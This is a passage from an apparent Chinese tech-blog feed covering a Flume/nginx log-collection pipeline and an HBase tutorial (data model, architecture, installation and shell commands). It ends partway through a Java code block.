1800*678</td></tr><tr><td>b_iev</td><td>string</td><td>浏览器信息useragent</td></tr><tr><td>u_ud</td><td>string</td><td>用户/访客唯一标识符</td></tr><tr><td>l</td><td>string</td><td>客户端语言</td></tr><tr><td>u_mid</td><td>string</td><td>会员id，和业务系统一致</td></tr><tr><td>u_sd</td><td>string</td><td>会话id</td></tr><tr><td>c_time</td><td>string</td><td>客户端时间</td></tr><tr><td>p_url</td><td>string</td><td>当前页面的url</td></tr><tr><td>p_ref</td><td>string</td><td>上一个页面的url</td></tr><tr><td>tt</td><td>string</td><td>当前页面的标题</td></tr><tr><td>ca</td><td>string</td><td>Event事件的Category名称</td></tr><tr><td>ac</td><td>string</td><td>Event事件的action名称</td></tr><tr><td>kv_*</td><td>string</td><td>Event事件的自定义属性</td></tr><tr><td>du</td><td>string</td><td>Event事件的持续时间</td></tr><tr><td>oid</td><td>string</td><td>订单id</td></tr><tr><td>on</td><td>string</td><td>订单名称</td></tr><tr><td>cua</td><td>string</td><td>支付金额</td></tr><tr><td>cut</td><td>string</td><td>支付货币类型</td></tr><tr><td>pt</td><td>string</td><td>支付方式</td></tr></tbody></table><h2 id="Java-SDK设计"><a href="#Java-SDK设计" class="headerlink" title="Java SDK设计"></a>Java SDK设计</h2><ul><li>本项目中java sdk的作用主要就是发送支付成功/退款成功的信息给nginx服务器</li><li>工作流：Start - 程序后台调用支付成功方法 - 单独线程发送ChargeRequest事件 - End</li><li>本项目中在程序后台只会出发chargeSuccess事件，本事件的主要作用是发送订单成功的信息给nginx服务器。发送格式同pc端发送方式，也是访问同一个url来进行数据的传输。格式为：<a href="http://node01/bigdata-tracker.png?requestData" target="_blank" rel="noopener">http://node01/bigdata-tracker.png?requestData</a></li><li>事件说明<ul><li>ChargeSuccess事件<ul><li>当会员最终支付成功的时候触发该事件，该事件需要程序主动调用</li><li>发送数据 <code>u_mid=msb&amp;c_time=1449142044528&amp;oid=orderid123&amp;ver=1&amp;en=e_cs&amp;pl=javaserver&amp;sdk=jdk</code></li><li>参数：orderId(订单ID，字符串必填)、memberId(会员ID，字符串必填)</li></ul></li><li>ChargeRefund事件<ul><li>当会员进行退款操作的时候触发该事件，该事件需要程序主动调用</li><li>发送数据 <code>u_mid=msb&amp;c_time=1449142044528&amp;oid=orderid123&amp;ver=1&amp;en=e_cr&amp;pl=jdk&amp;sdk=java</code></li><li>参数：orderId(订单ID，字符串必填)、memberId(会员ID，字符串必填)</li></ul></li></ul></li><li>集成方式：直接将java的sdk引入到项目中即可，或者添加到classpath中</li><li>数据参数说明</li></ul><table><thead><tr><th>参数名称</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>en</td><td>string</td><td>事件名称, eg: e_cs</td></tr><tr><td>ver</td><td>string</td><td>版本号, eg: 0.0.1</td></tr><tr><td>pl</td><td>string</td><td>平台, eg: website,javaweb,php</td></tr><tr><td>sdk</td><td>string</td><td>Sdk类型, eg: java</td></tr><tr><td>u_mid</td><td>string</td><td>会员id，和业务系统一致</td></tr><tr><td>c_time</td><td>string</td><td>客户端时间</td></tr><tr><td>oid</td><td>string</td><td>订单id</td></tr></tbody></table><h2 id="Nginx接受日志请求"><a href="#Nginx接受日志请求" class="headerlink" title="Nginx接受日志请求"></a>Nginx接受日志请求</h2><ul><li>nginx.conf</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    <span class="comment"># 设置日志格式，方便后续提取(^A为分隔符，需要手动按键Ctrl+V+A进行输入)。msec: 当前时间，单位是秒，精度是毫秒</span></span><br><span class="line">    log_format bigdata_format <span class="string">'$remote_addr^A$msec^A$http_host^A$request_uri'</span>;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        <span class="comment"># 访问 http://node01/bigdata-tracker.png?id=123 打印的日志如 192.168.6.11628333945.269node01/bigdata-tracker.png?id=123 (其中的分割符不可见)</span></span><br><span class="line">        location = /bigdata-tracker.png &#123;</span><br><span class="line">            default_type image/png;</span><br><span class="line">            access_log /opt/data/access.log bigdata_format;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Flume传输日志"><a href="#Flume传输日志" class="headerlink" title="Flume传输日志"></a>Flume传输日志</h2><ul><li>Flume参考<a href="/_posts/bigdata/bigdata-tools.md#Flume">bigdata-tools.md#Flume</a></li><li>项目Flume配置文件<code>user-analysis.conf</code>，此处选择直接写入到HDFS，还可以写入Hive/Hbase</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 监听本地nginx日志文件access.log</span></span><br><span class="line"><span class="comment"># -F：等同于 –follow=name --retry，根据文件名进行追踪，并保持重试，即该文件被删除或改名后，如果再次创建相同的文件名，会继续追踪</span></span><br><span class="line">a1.sources.r1.type = <span class="built_in">exec</span></span><br><span class="line">a1.sources.r1.command = tail -F /opt/data/access.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将数据保存到HDFS，需要配置 HADOOP_HOME 环境变量，即需在HDFS节点上启动Agent</span></span><br><span class="line"><span class="comment"># 参考 https://flume.liyifeng.org/#hdfs-sink</span></span><br><span class="line">a1.sinks.k1.type = hdfs</span><br><span class="line">a1.sinks.k1.hdfs.path = /project/%Y%m%d</span><br><span class="line">a1.sinks.k1.hdfs.filePrefix = <span class="built_in">log</span>-</span><br><span class="line">a1.sinks.k1.hdfs.rollInterval = 0</span><br><span class="line">a1.sinks.k1.hdfs.rollSize = 10240</span><br><span class="line">a1.sinks.k1.hdfs.rollCount = 0</span><br><span class="line">a1.sinks.k1.hdfs.idleTimeout = 30</span><br><span class="line">a1.sinks.k1.hdfs.fileType = DataStream</span><br><span class="line">a1.sinks.k1.hdfs.callTimeout = 60000</span><br><span class="line">a1.sinks.k1.hdfs.useLocalTimeStamp = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use a channel which buffers events in memory</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br></pre></td></tr></table></figure><ul><li>启动<code>flume-ng agent --conf-file ~/flume/user-analysis.conf --name a1 -Dflume.root.logger=INFO,console</code></li><li>在日志收集系统触发日志生成，会产生如 /project/20210808/log-.1628394865013 的数据文件<ul><li>启动<code>hadoop_project_log_source</code>模块，参考smjava代码</li><li>访问<code>http://localhost:8080/hadoop_project_log_source/</code>进入页面进行事件触发</li></ul></li></ul><h2 id="ETL-MR数据清洗"><a href="#ETL-MR数据清洗" class="headerlink" title="ETL-MR数据清洗"></a>ETL-MR数据清洗</h2><ul><li><code>ETL</code>(Extract-Transform-Load，抽取-转换-存储）即在数据抽取过程中进行数据的加工转换，然后加载到存储中。常见的如Informatics和开源工具Kettle，当然也可直接使用MapReduce进行清洗。此案例为巩固理解MR原理，因此选用MR进行清洗</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;本项目源码参考&lt;a href=&quot;https://github.com/oldinaction/smjava&quot; target=&quot;_
      
    
    </summary>
    
      <category term="bigdata" scheme="http://blog.aezo.cn/categories/bigdata/"/>
    
    
      <category term="project" scheme="http://blog.aezo.cn/tags/project/"/>
    
  </entry>
  
  <entry>
    <title>HBase</title>
    <link href="http://blog.aezo.cn/2021/07/18/bigdata/hbase/"/>
    <id>http://blog.aezo.cn/2021/07/18/bigdata/hbase/</id>
    <published>2021-07-18T04:01:00.000Z</published>
    <updated>2021-08-31T06:07:20.335Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>Use Apache HBase™ when you need random, realtime read/write access to your Big Data. This project’s goal is the hosting of very large tables – billions of rows X millions of columns – atop clusters of commodity hardware. Apache HBase is an open-source, distributed, versioned, non-relational database modeled after Google’s Bigtable: A Distributed Storage System for Structured Data by Chang et al. Just as Bigtable leverages the distributed data storage provided by the Google File System, Apache HBase provides Bigtable-like capabilities on top of Hadoop and HDFS.</p></blockquote><ul><li><a href="http://hbase.apache.org/" target="_blank" rel="noopener">官网</a>、<a href="http://hbase.apache.org/2.3/book.html" target="_blank" rel="noopener">wiki v2.3</a>、<a href="http://abloz.com/hbase/book.html#hbase_default_configurations" target="_blank" rel="noopener">hbase相关配置说明</a></li><li>HBase的全称是Hadoop Database，是一个高可靠性，高性能、面向列、可伸缩、实时读写的分布式数据库<ul><li>利用Hadoop HDFS作为其文件存储系统，利用Hadoop MapReduce来处理HBase中的海量数据，利用Zookeeper作为其分布式协同服务</li><li>主要用来存储非结构化和半结构化数据的松散数据（列存NoSQL数据库，NoSQL的全称是Not Only SQL，泛指非关系型数据库）</li></ul></li><li><a href="https://phoenix.apache.org/index.html" target="_blank" rel="noopener">phoenix</a>，phoenix支持jdbc连接和标准的SQL语句，架构上处于hbase和client之间，从而client只需要提交标准SQL即可</li></ul><h3 id="HBase数据模型"><a href="#HBase数据模型" class="headerlink" title="HBase数据模型"></a>HBase数据模型</h3><ul><li>Rowkey<ul><li>决定一行数据，每行记录的唯一标识</li><li>按照字典序排序</li><li>RowKey只能存储64K的字节数据，但是一般使用10-100个字节</li></ul></li><li>Column Family &amp; Qualifier<ul><li>HBase表中的每个列都归属于某个列族，列族必须作为表模式(schema)定义的一部分预先给出。如 <code>create &#39;test&#39;, &#39;course&#39;</code></li><li>列名以列族作为前缀，每个“列族”都可以有多个列成员(column)；如course:math, course:english, 新的列族成员（列）可以随后按需、动态加入</li><li>权限控制、存储以及调优都是在列族层面进行的</li><li>HBase把同一列族里面的数据存储在同一目录下，由几个文件保存</li></ul></li><li>TimeStamp时间戳<ul><li>在HBase每个cell存储单元对同一份数据有多个版本，根据唯一的时间戳来区分每个版本之间的差异，不同版本的数据按照时间倒序排序，最新的数据版本排在最前面</li><li>时间戳的类型是64位整型</li><li>时间戳可以由HBase(在数据写入时自动)赋值，此时间戳是精确到毫秒的当前系统时间</li><li>时间戳也可以由客户显式赋值，如果应用程序要避免数据版本冲突，就必须自己生成具有唯一性的时间戳</li></ul></li><li>Cell<ul><li>由行和列的坐标交叉决定</li><li>单元格是有版本的</li><li>单元格的内容是未解析的字节数组</li><li>由 <strong><code>{rowKey, column(=&lt;family&gt;+&lt;qualifier&gt;), version}</code></strong> 唯一确定的单元，rowKey类似主键</li><li>cell中的数据是没有类型的，全部是字节数组形式存贮</li></ul></li></ul><h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img src="/data/images/bigdata/hbase-arch.png" alt="hbase-arch.png"></p><h4 id="角色介绍"><a href="#角色介绍" class="headerlink" title="角色介绍"></a>角色介绍</h4><ul><li>Client<ul><li>包含访问HBase的接口并维护cache来加快对HBase的访问</li></ul></li><li>Zookeeper<ul><li>保证任何时候，集群中只有一个活跃master</li><li>存储所有region(表名)的寻址入口</li><li>实时监控region server的上线和下线信息，并实时通知master</li><li>存储HBase的schema和table元数据</li></ul></li><li>HMaster<ul><li>为region server分配region</li><li>负责region server的负载均衡</li><li>发现失效的region server并重新分配其上的region</li><li>管理用户对table的增删改操作</li></ul></li><li>HRegionServer<ul><li>region server维护region，处理对这些region的IO请求</li><li>region server负责切分在运行过程中变得过大的region</li></ul></li></ul><h4 id="HRegionServer组件介绍"><a href="#HRegionServer组件介绍" class="headerlink" title="HRegionServer组件介绍"></a>HRegionServer组件介绍</h4><ul><li><strong>一张表由一组HRegion组成，一个HRegion由一组Store组成，一个Store对应一个列族(CF)，一个Store包含一个Memstore和一组StoreFile，一个StoreFile由一组HFile组成</strong></li><li>HRegion<ul><li>HBase自动把表水平划分成多个区域(region)，每个region会保存一个表里某段连续的数据</li><li>每个表一开始只有一个region，随着数据不断插入表，region不断增大，当增大到一个阈值的时候，region就会等分会两个新的region（裂变），保存到不同的RegionServer</li><li>HRegion是HBase中分布式存储和负载均衡的最小单元。最小单元就表示不同的HRegion可以分布在不同的 HRegion server上</li></ul></li><li>Store中的Memstore与Storefile<ul><li>store包括位于内存中的memstore和位于磁盘(hdfs)的storefile。写操作先写入memstore，当memstore中的数据达到某个阈值，regionserver会启动flashcache进程写入storefile，每次写入形成单独的一个storefile</li><li>当storefile文件的数量增长到一定阈值后，系统会进行合并(minor、major)，在合并过程中会进行版本合并和删除工作(majar)，形成更大的storefile</li><li>当一个region所有storefile的大小和数量超过一定阈值后，会把当前的region分割为两个，并由hmaster分配到相应的regionserver服务器，实现负载均衡</li><li>客户端检索数据，先在memstore找，找不到去blockcache，找不到再找storefile(从storefile找到的数据会缓存到blockcache)</li><li>StoreFile以HFile格式保存在HDFS上</li></ul></li></ul><h4 id="HBase读写流程"><a href="#HBase读写流程" class="headerlink" title="HBase读写流程"></a>HBase读写流程</h4><ul><li>读流程<ul><li>客户端从zookeeper中获取meta表(存储HBase表字段信息)所在的regionserver节点信息</li><li>客户端访问meta表所在的regionserver节点，获取到region所在的regionserver信息</li><li>客户端访问具体的region所在的regionserver，找到对应的region及store</li><li>然后从memstore中读取数据，如果读取到了那么直接将数据返回，如果没有，则去blockcache读取数据</li><li>如果blockcache中读取到数据，则直接返回数据给客户端，如果读取不到，则遍历storefile文件，查找数据</li><li>如果从storefile中读取到数据，那么需要将数据先缓存到<code>blockcache</code>中（方便下一次读取），然后再将数据返回给客户端<ul><li>blockcache是内存空间，如果缓存的数据比较多，满了之后会采用LRU策略，将比较老的数据进行删除</li><li>blockcache有三块内存空间(类似JVM的新生代)，第一次、第二次、第三次访问分别放到第一个、第二个、第三个内存空间，淘汰时会优先淘汰第一个内存空间</li></ul></li></ul></li><li>写流程<br>  ​- 客户端从zookeeper中获取meta表所在的regionserver节点信息<ul><li>客户端访问meta表所在的regionserver节点，获取到region所在的regionserver信息</li><li>客户端访问具体的region所在的regionserver，找到对应的region及store</li><li>开始写数据，写数据的时候会先想hlog中写一份数据（方便memstore中数据丢失后能够根据hlog恢复数据，向hlog中写数据的时候也是优先写入内存，后台会有一个线程定期异步刷写数据到hdfs，如果hlog的数据也写入失败，那么数据就会发生丢失）</li><li>hlog写数据完成之后，会先将数据写入到memstore，memstore默认大小是64M，当memstore满了之后会进行统一的溢写操作，将memstore中的数据持久化到hdfs中</li><li>频繁的溢写会导致产生很多的小文件，因此会进行文件的合并，文件在合并的时候有两种方式，minor和major，minor表示小范围文件的合并，major表示将所有的storefile文件都合并成一个</li></ul></li></ul><h2 id="HBase安装"><a href="#HBase安装" class="headerlink" title="HBase安装"></a>HBase安装</h2><ul><li>本文基于Hbase v2.3.5(要求JDK1.8, Hadoop v2.10.x), <a href="https://mirrors.bfsu.edu.cn/apache/hbase/2.3.5/hbase-2.3.5-bin.tar.gz" target="_blank" rel="noopener">下载</a></li><li>HA安装参考：<a href="http://hbase.apache.org/book.html#quickstart_fully_distributed" target="_blank" rel="noopener">http://hbase.apache.org/book.html#quickstart_fully_distributed</a></li><li>HMaster: node01、node04(备), HRegionServer: node02-node04</li><li>设置时间同步，关闭防火墙，node01/node04可免密登录其他机器(test账号)</li><li>安装</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## node01上执行</span></span><br><span class="line"><span class="built_in">cd</span> /opt/bigdata</span><br><span class="line">tar -zxvf hbase-2.3.5-bin.tar.gz</span><br><span class="line">rm -rf /opt/bigdata/hbase-2.3.5/docs/ <span class="comment"># 加快之后传输速度</span></span><br><span class="line"><span class="comment"># 开启JAVA_HOME配置，即`export JAVA_HOME=/usr/java/jdk1.8.0_202-amd64`</span></span><br><span class="line"><span class="comment"># 关闭内置ZK，即`export HBASE_MANAGES_ZK=false`</span></span><br><span class="line">vi /opt/bigdata/hbase-2.3.5/conf/hbase-env.sh</span><br><span class="line"><span class="comment"># 参考下文配置</span></span><br><span class="line">vi /opt/bigdata/hbase-2.3.5/conf/hbase-site.xml</span><br><span class="line"><span class="comment"># 设置RegionServer分布在哪几台节点，此处node02、node03、node04(换行写入，删掉原来的localhost)</span></span><br><span class="line">vi /opt/bigdata/hbase-2.3.5/conf/regionservers</span><br><span class="line"><span class="comment"># 创建下列文件，写入`node04`备用Master，达到高可用</span></span><br><span class="line">vi /opt/bigdata/hbase-2.3.5/conf/backup-masters</span><br><span class="line"><span class="comment"># 拷贝hdfs-site.xml文件到conf目录下</span></span><br><span class="line">cp /opt/bigdata/hadoop-2.10.1/etc/hadoop/hdfs-site.xml /opt/bigdata/hbase-2.3.5/conf</span><br><span class="line"><span class="comment"># 复制文件到node02-node04节点。/opt/bigdata所有者为test，如果为root可以先移动过去再修改文件所有权</span></span><br><span class="line">scp -r /opt/bigdata/hbase-2.3.5 <span class="built_in">test</span>@node02:/opt/bigdata</span><br><span class="line">scp -r /opt/bigdata/hbase-2.3.5 <span class="built_in">test</span>@node03:/opt/bigdata</span><br><span class="line">scp -r /opt/bigdata/hbase-2.3.5 <span class="built_in">test</span>@node04:/opt/bigdata</span><br><span class="line"></span><br><span class="line"><span class="comment">## 在node01-node04上，增加配置 `export HBASE_HOME=/opt/bigdata/hbase-2.3.5`，并在export PATH后面加上`:$HBASE_HOME/bin`</span></span><br><span class="line">vi /etc/profile</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment">## 在node01上(master节点)启动，会自动其他其他RegionServer节点。jps查看会出现HMaster、HRegionServer的进程</span></span><br><span class="line">start-hbase.sh</span><br><span class="line"><span class="comment"># 进入hbase命令行，显示 `hbase(main):001:0&gt;`</span></span><br><span class="line">hbase shell</span><br><span class="line"><span class="comment"># 访问hbase管理页面</span></span><br><span class="line">http://node01:16010/</span><br></pre></td></tr></table></figure><ul><li>在 hbase-site.xml 中增加如下配置</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 会自动在hdfs中创建hbase目录(data表空间数据目录，WALs存储未过期的日志，oldWALs存储已过期的2天内的日志) --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.rootdir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://aezocn/hbase<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.cluster.distributed<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- zk中默认使用 /hbase 的命名空间 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.zookeeper.quorum<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>node01,node02,node03<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="启停"><a href="#启停" class="headerlink" title="启停"></a>启停</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在node01上(master节点)启动，会自动其他其他RegionServer节点。jps查看会出现HMaster、HRegionServer的进程</span></span><br><span class="line">start-hbase.sh</span><br><span class="line"><span class="comment"># 进入hbase命令行，显示 `hbase(main):001:0&gt;`，`help`查看命令帮助</span></span><br><span class="line">hbase shell</span><br><span class="line"><span class="comment"># 访问hbase管理页面</span></span><br><span class="line">http://node01:16010/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止</span></span><br><span class="line">stop-hbase.sh</span><br></pre></td></tr></table></figure><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入命令行</span></span><br><span class="line">hbase shell</span><br><span class="line"><span class="comment"># 查看某个HStoreFile文件</span></span><br><span class="line"><span class="comment"># 下列HStoreFile，不是一般的文本格式，需要使用以下命令查看，返回结果如下</span></span><br><span class="line"><span class="comment"># K: 1/cf:name/1626701620132/Put/vlen=8/seqid=4 V: zhangsan</span></span><br><span class="line"><span class="comment"># Scanned kv count -&gt; 1</span></span><br><span class="line">hbase hfile -p -f /hbase/data/default/psn/c6eb6d681adeb57094901c220f049784/cf/6b35a028d9ff43eb9ef9533968e01da4</span><br><span class="line"></span><br><span class="line"><span class="comment">## hbase shell命令</span></span><br><span class="line"><span class="built_in">help</span> <span class="comment"># 查看命令帮助</span></span><br><span class="line"><span class="built_in">help</span> <span class="string">"create"</span> <span class="comment"># 查看某个命令帮助，注意双引号</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列举命名空间，类似数据库。默认有hbase(元数据)、default(默认)</span></span><br><span class="line">list_namespace</span><br><span class="line"><span class="comment"># 列举某个表空间的表</span></span><br><span class="line">list_namespace_tables <span class="string">'hbase'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在当前表空间创建表psn, 并定义一个column family名为cf. 对应在hdfs中创建 /hbase/data/default/psn 文件夹</span></span><br><span class="line">create <span class="string">'psn'</span>, <span class="string">'cf'</span></span><br><span class="line"><span class="comment"># 列举当前表空间的表</span></span><br><span class="line">list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 往psn表中插入一条数据，rowKey=1(类似主键), cf族中name=zhangsan</span></span><br><span class="line">put <span class="string">'psn'</span>, <span class="string">'1'</span>, <span class="string">'cf:name'</span>, <span class="string">'zhangsan'</span></span><br><span class="line">put <span class="string">'psn'</span>, <span class="string">'2'</span>, <span class="string">'cf:name'</span>, <span class="string">'lisi'</span></span><br><span class="line">put <span class="string">'psn'</span>, <span class="string">'1'</span>, <span class="string">'cf:name'</span>, <span class="string">'zhang san'</span> <span class="comment"># 插入新值，等同于修改原数据(获取数据时，会返回最新时间戳下的数据)</span></span><br><span class="line"><span class="comment"># 查询psn中，rowKey=1的name列值. 返回CELL：timestamp=2021-07-19T21:28:49.334, value=zhang san</span></span><br><span class="line">get <span class="string">'psn'</span>, <span class="string">'1'</span>, <span class="string">'cf:name'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询psn表的所有数据，尽量规避使用scan</span></span><br><span class="line">scan <span class="string">'psn'</span></span><br><span class="line"><span class="comment"># 统计psn表行个数</span></span><br><span class="line">count <span class="string">'psn'</span></span><br><span class="line"><span class="comment"># 清空psn表</span></span><br><span class="line">truncate <span class="string">'psn'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 必须先禁用表后，才能删除表</span></span><br><span class="line"><span class="built_in">disable</span> <span class="string">'psn'</span></span><br><span class="line">drop <span class="string">'psn'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动刷新缓存，每次手动或自动flush都会产生一个HStoreFile(达到一定条件则会进行合并)</span></span><br><span class="line">flush <span class="string">'psn'</span></span><br></pre></td></tr></table></figure><h2 id="客户端API操作-java"><a href="#客户端API操作-java" class="headerlink" title="客户端API操作(java)"></a>客户端API操作(java)</h2><ul><li>HBase支持多种语言的API操作，参考：<a href="http://hbase.apache.org/2.3/book.html#external_apis" target="_blank" rel="noopener">http://hbase.apache.org/2.3/book.html#external_apis</a></li><li>基于Java操作时，对于对象的序列化可使用<code>ProtoBuf</code><ul><li>从而将相同rowKey的列操作进行合并成对象提交，从而减少了rowKey的重复次数，到达节省空间的目的</li><li>由于序列化后，查看hfile时无法直接人眼识别，需要反序列化才可</li></ul></li></ul><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><ul><li>引入依赖</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.hbase/hbase-client --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hbase<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hbase-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>简要代码举例(无需引入core-site.xml等)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 